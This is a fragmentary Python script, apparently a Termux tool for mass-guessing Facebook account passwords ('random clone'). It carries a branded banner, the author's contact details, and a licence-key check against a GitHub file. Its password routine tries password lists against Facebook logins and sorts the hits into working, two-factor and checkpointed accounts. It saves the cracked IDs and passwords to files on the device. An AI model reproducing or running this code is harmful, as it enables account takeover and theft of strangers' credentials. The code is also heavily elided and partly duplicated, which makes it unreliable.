...
██   ██     ██   ██     ██   ██ 
██   ██     ██   ██     ██   ██                                                               
\033[1;37m╔═════════════════\033[1;33m𝐀𝐗𝐁✯𝐓𝐄𝐀𝐌\033[1;37m══════════════╗
\033[1;31m│\033[1;32m☞  \033[1;32m𝐀𝐔𝐓𝐇𝐎𝐑     \033[1;31m➟   \033[1;32mHANIYA BALOCH      \033[1;31m│
\033[1;31m│\033[1;32m☞  \033[1;32m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊   \033[1;31m➟   \033[1;32mReactor Hun \033[1;31m     │
\033[1;31m│\033[1;32m☞  \033[1;32m𝐆𝐈𝐓𝐇𝐔𝐁    \033[1;31m ➟   \033[1;32mHaniyabaloch0786             \033[1;31m │
\033[1;31m│\033[1;32m☞  \033[1;32m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏  \033[1;31m ➟   \033[1;32m+923265089431             \033[1;31m │
\033[1;31m│\033[1;32m☞  \033[1;32m𝐕𝐄𝐑𝐒𝐈𝐎𝐍   \033[1;31m ➟   \033[1;32m0.4                     \033[1;31m   │
\033[1;31m│\033[1;32m☞  \033[1;32m𝐘𝐎𝐔𝐓𝐔𝐁𝐄   \033[1;31m ➟   \033[1;32mBache Use Karty Hain             \033[1;31m   │
\033[1;37m╚ FACEBOOK TRICKS AND HELPING ZONE{ HBF }\033[1;37mⒽⒷⒻ╝
\033[1;91m==========================================================
\033[31;44m EVERYONE THINKS OF CHANGING THE WORLD     
 BUT NO ONE THINKS OF CHANGING HERSELF.. 🍂\033[0;m
\033[1;91m=========================================================="""
...
def my_tool_security():
    ...
    print(47*"-")
    print(c, 45*"-", wit)
    print("\t  Facebook : Rêaçtôŕ Hùñ ")
    print("\t  Fb page  : Shehzadi")
    print("\t  Github   : Haniyabaloch0786")
    print(c, 45*"-")
    print(47*"-")
    try:
    ...
    my_server=requests.get("https://raw.githubusercontent.com/Haniyabaloch0786/F_2/main/Approval.txt").text
    if f_token in my_server:
        ...
        print(" to HANIYA Programmer fb page and your key")
        print(" otherwise msg on this whatsapp 03265089431 \n")
        print(" Copy your Key :",gre,f_token+_help,wit,"\n")
        os.system("xdg-open https://www.facebook.com/profile.php?id=100009949692643")
        exit()
...
#---------------------[MAIN MENU]---------------------#
def xyz():
    os.system("play-audio WELCOME_TO_HANIYA_RANDOM_CLONE_TOOL.mp3")
    os.getuid
    ...
    if hamii in ["1","01"]:
        ...
        os.system("xdg-open https://www.facebook.com/profile.php?id=100009949692643");xyz()
    elif HANI in ["4","04"]:
        os.system("xdg-open https://wa.me/+923265089432")
        xyz()    
    elif HANI in ["0","00"]:
       exit()
    else:
...
def password():
    ...
    linex()
    print("")
    passX = input(f" {RED}CHOOSE{HANI2} : ")
    if passX in ['1','01']:
        ...
        for ps in pwx:
           ...
           "scheme": 'https',
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[7:22]
                os.system("play-audio HANII_OK.mp3")
                print('\r\033[1;32m[HANII-OK] '+uid+' [√] '+ps+ '')
                ...
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    os.system("play-audio HANII_2F.mp3")
                    print('\r\033[1;34m[HAMII-2F] '+uid+' [~] '+ps+' ')
                    open('/sdcard/HANII-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    os.system("play-audio HANII_CP.mp3")
                    print(f'\r\033[1;30m[HANII-CP] '+uid+' [×] '+ps+ ' ')
                    open('/sdcard/HANII-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[HANII 🔥] [%s] \33[1;97m[OK:%s{HANI2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
        checks(ok,cp)
    except:
        pass
           ...
           "scheme": 'https',
            ...
            if 'c_user' in log_cookies:
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    os.system("play-audio HAMII_CP.mp3")
                    print(f'\r\033[1;30m[HANII-CP] '+uid+' [×] '+ps+ ' ')
                    open('/sdcard/HANI-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
